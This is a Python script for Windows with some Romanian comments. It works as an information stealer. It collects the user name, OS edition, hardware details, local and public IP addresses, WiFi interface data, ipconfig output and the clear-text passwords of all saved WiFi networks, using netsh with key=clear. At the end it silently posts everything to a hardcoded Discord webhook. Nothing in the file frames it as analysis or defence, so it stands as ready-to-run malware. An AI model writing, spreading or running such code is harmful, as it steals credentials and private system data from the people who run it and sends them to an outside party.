import subprocess
import socket
import os
import requests
import platform
import getpass
import urllib.request  
webhook = "https://discord.com/api/webhooks/1568344051365711922/8wsoRQRVOcxd4OnQXL-YovC3dUgq-iwZm4HprnKK_Hwid9rKvjDc2UnsfYWI0oTudEbQ" 


def run_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)\
            .decode(errors="ignore").strip()
    except:
        return None

def gather_simple_info():
    output = "=== User Info ===\n"
    try:
        username = getpass.getuser()
    except:
        username = os.environ.get("USERNAME") or "Utilizator necunoscut"

    try:
        hostname = socket.gethostname()
        
        # Extrage versiunea comercială prietenoasă (ex: Windows 11 Pro)
        win_version_friendly = run_command('powershell "(Get-CimInstance Win32_OperatingSystem).Caption"')
        if not win_version_friendly:
            win_version_friendly = f"{platform.system()} {platform.release()}"
            
        output += f"Logged-in User: {username}\n"
        output += f"OS Edition: {win_version_friendly}\n\n"
    except Exception as e:
        output += f"Eroare date sistem: {e}\n\n"
        
    return output


output = ""

output += gather_simple_info()

# ------------------------
# System Info
# ------------------------
output += "=== System Info ===\n"
try:
    hostname = socket.gethostname()
    os_name = platform.system()
    os_version = platform.version()

    output += f"PC Name: {hostname}\n"
    output += f"OS Build: {os_name} {os_version}\n\n"
except Exception as e:
    output += f"Error: {e}\n\n"

# ------------------------
# Hardware Info
# ------------------------
output += "=== Hardware Info ===\n"
try:
    cpu = run_command('powershell "Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name"')
    ram = run_command('powershell "(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory"')
    gpu = run_command('powershell "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"')

    output += f"CPU: {cpu if cpu else 'Not available'}\n"

    if ram:
        try:
            ram_gb = round(int(ram) / (1024**3), 2)
            output += f"RAM: {ram_gb} GB\n"
        except:
            output += f"RAM: {ram}\n"
    else:
        output += "RAM: Not available\n"

    output += f"GPU:\n{gpu if gpu else 'Not available'}\n\n"
except Exception as e:
    output += f"Hardware Error: {e}\n\n"

# ------------------------
# IP Info (Public + Local)
# ------------------------
output += "=== IP Info ===\n"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    output += f"Local IP: {local_ip}\n"
except:
    output += "Local IP: Not available\n"

try:
    
    with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
        public_ip = response.read().decode('utf-8').strip()
    output += f"Public IP: {public_ip}\n\n"
except Exception as e:
    output += "Public IP: Not available\n\n"

# ------------------------
# WiFi Info
# ------------------------
output += "=== WiFi Info ===\n"
wifi = run_command("netsh wlan show interfaces")
if wifi and "There is no wireless interface" not in wifi:
    output += wifi + "\n\n"
else:
    output += "Not available (Ethernet / disabled / no permission)\n\n"

# ------------------------
# Saved WiFi Profiles
# ------------------------
output += "=== Saved WiFi Networks ===\n"
profiles_data = run_command("netsh wlan show profiles")
if profiles_data:
    profiles = []
    for line in profiles_data.split("\n"):
        if "All User Profile" in line:
            parts = line.split(":")
            if len(parts) > 1:
                profiles.append(parts[1].strip())

    if profiles:
        for p in profiles:
            details = run_command(f'netsh wlan show profile name="{p}" key=clear')
            if details and "Key Content" in details:
                for line in details.split("\n"):
                    if "Key Content" in line:
                        parts_pass = line.split(":")
                        if len(parts_pass) > 1:
                            password = parts_pass[1].strip()
                            output += f"{p} : {password}\n"
                            break
            else:
                output += f"{p} : (No access)\n"
    else:
        output += "No saved networks found\n"
else:
    output += "Not available\n"

output += "\n"

# ------------------------
# Network Details
# ------------------------
output += "=== Network Details ===\n"
net = run_command("ipconfig")
if net:
    output += net + "\n\n"
else:
    output += "Could not retrieve network details\n\n"


requests.post(webhook, json={
    "content": output
})
